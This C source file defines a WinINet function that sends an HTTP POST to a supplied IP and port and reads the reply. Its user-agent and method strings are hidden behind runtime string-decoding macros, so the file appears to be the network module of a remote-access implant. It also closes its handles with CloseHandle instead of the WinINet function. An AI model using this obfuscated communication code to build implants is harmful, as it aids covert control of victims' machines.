#include "debug.h"
#include "internet.h"

DWORD connectServer(const char* ip,
                    WORD port,
                    const char* resource,
                    LPBYTE bufferRequest,
                    DWORD requestBytes,
                    LPBYTE bufferReply,
                    DWORD bufferReplyMaxBytes,
                    DWORD *bufferReplyBytes) {
    HINTERNET hInternet, hConnect, hRequest;
    BOOL bResult;
    
    LAIKA_BOX_STARTVAR(char*, useragent, KEY_interneth_USERAGENT, DATA_interneth_USERAGENT)
    hInternet = InternetOpenA(useragent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    LAIKA_BOX_ENDVAR(useragent)

    if (!hInternet) {
        debug_printf("InternetOpen failed with error: %lu\n", GetLastError());
        return ERROR_GEN_FAILURE;
    }
    // Connect to the HTTP server with IP and port
    hConnect = InternetConnectA(hInternet, ip, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        debug_printf("InternetConnect failed with error: %lu\n", GetLastError());
        CloseHandle(hInternet);
        return ERROR_GEN_FAILURE;
    }

    // Create an HTTP request handle without HTTPS
    LAIKA_BOX_STARTVAR(char*, param_post, KEY_internet_connectServer_POST, DATA_internet_connectServer_POST)
    #ifdef PRODUCTION 
    hRequest = HttpOpenRequestA(
        hConnect,
        param_post,
        resource,
        NULL,
        NULL,
        NULL,
        INTERNET_FLAG_SECURE,
        0);
    #else
    hRequest = HttpOpenRequestA(hConnect, param_post, resource, NULL, NULL, NULL, 0, 0);
    #endif
    LAIKA_BOX_ENDVAR(param_post);
    if (!hRequest) {
        debug_printf("HttpOpenRequest failed with error: %lu\n", GetLastError());
        CloseHandle(hInternet);
        CloseHandle(hConnect);
        return ERROR_GEN_FAILURE;
    }
    // Send the HTTP request
    bResult = HttpSendRequestA(hRequest, "", -1, (LPVOID)bufferRequest, requestBytes);

    // Handle response
    if (!bResult) {
        // Clean up handles
        debug_printf("HttpSendRequest failed with error: %lu\n", GetLastError());
        CloseHandle(hInternet);
        CloseHandle(hConnect);
        CloseHandle(hRequest);
        return ERROR_GEN_FAILURE;
    }
    debug_printf("\n In Func: connectServer():Data sent successfully.\n");
    // debug_printf("bufferRequest: %.*s\n", (int)requestBytes, bufferRequest);
    // Read the response
    DWORD dwTotalBytesRead = 0;
    BYTE chunk[64] = {0};
    INTERNET_BUFFERSA reply;

    ZeroMemory(&reply, sizeof(reply));
    reply.dwStructSize = sizeof(reply);
    reply.lpvBuffer = chunk;
    reply.dwBufferLength = sizeof(chunk);
    for (;;) {
        if (!InternetReadFileExA(hRequest, &reply, IRF_SYNC, 0)) {
            debug_printf("InternetReadFileExA error: %lu\n", GetLastError());
            CloseHandle(hInternet);
            CloseHandle(hConnect);
            CloseHandle(hRequest);
            return GetLastError();
        }
        // No more data to read
        if (reply.dwBufferLength == 0) break;
        // check if overflow the reply buffer. if happens,
        // this function will give as much as max reply buffer len data
        if (reply.dwBufferLength + dwTotalBytesRead > bufferReplyMaxBytes) {
            memcpy(&bufferReply[dwTotalBytesRead], reply.lpvBuffer,
                   bufferReplyMaxBytes - dwTotalBytesRead);
            dwTotalBytesRead = bufferReplyMaxBytes;
            break;
        }
        // copy the buffer to buffer reply chunk by chunk
        memcpy(&bufferReply[dwTotalBytesRead], reply.lpvBuffer, reply.dwBufferLength);
        dwTotalBytesRead += reply.dwBufferLength;
        // reset struct reply
        reply.dwBufferLength = sizeof(chunk);
        ZeroMemory(reply.lpvBuffer, sizeof(chunk));
    }

    *bufferReplyBytes = dwTotalBytesRead;
    CloseHandle(hInternet);
    CloseHandle(hConnect);
    CloseHandle(hRequest);

    if (0 == dwTotalBytesRead) return ERROR_GEN_FAILURE;

    debug_printf("connect Server received:%ld bytes", dwTotalBytesRead);
    // debug_printf("connect Server received:%.*s", dwTotalBytesRead, bufferReply);
    return ERROR_SUCCESS;
}